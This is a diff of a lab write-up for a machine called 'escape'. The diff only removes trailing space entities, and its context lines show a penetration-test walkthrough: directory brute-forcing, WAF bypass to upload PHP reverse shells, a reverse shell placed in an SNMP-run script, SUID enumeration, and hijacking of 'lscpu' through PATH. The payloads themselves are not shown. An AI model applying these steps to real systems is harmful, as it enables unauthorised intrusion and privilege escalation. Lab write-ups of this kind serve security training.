@@ -49,7 +49,7 @@ $ feroxbuster -u http://192.168.157.113:8080
 
 <figure><img src="../../../.gitbook/assets/image (3736).png" alt=""><figcaption></figcaption></figure>
 
-This was a PHP page, so uploading PHP reverse shells is the priority, and there's a pretty good WAF. I tested loads of method of bypassing it, and this machine requires a combination of quite a few.&#x20;
+This was a PHP page, so uploading PHP reverse shells is the priority, and there's a pretty good WAF. I tested loads of method of bypassing it, and this machine requires a combination of quite a few.
 
 <figure><img src="../../../.gitbook/assets/image (3731).png" alt=""><figcaption></figcaption></figure>
 
@@ -103,7 +103,7 @@ view   systemonly  included   .1.3.6.1.2.1.25.1
 <TRUNCATED>
 ```
 
-Firstly, we have the password string required. Next, we have some sort of script execution within the machine. We can put a reverse shell there instead.&#x20;
+Firstly, we have the password string required. Next, we have some sort of script execution within the machine. We can put a reverse shell there instead.
 
 ```bash
 #!/bin/bash
@@ -128,7 +128,7 @@ Debian-snmp@escape:/$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/logconsole
 ```
 
-`logconsole` was the one I didn't recognise.&#x20;
+`logconsole` was the one I didn't recognise.
 
 ```
 Debian-snmp@escape:/$ file /usr/bin/logconsole                                               
@@ -184,7 +184,7 @@ putchar(10, 0x7ffe428abfd0, 0x56520b53f650, 0
 system("lscpu"Architecture:        x86_64
 ```
 
-This means we can create our own `lscpu` binary to run.&#x20;
+This means we can create our own `lscpu` binary to run.
 
 ```
 $ cat lscpu 
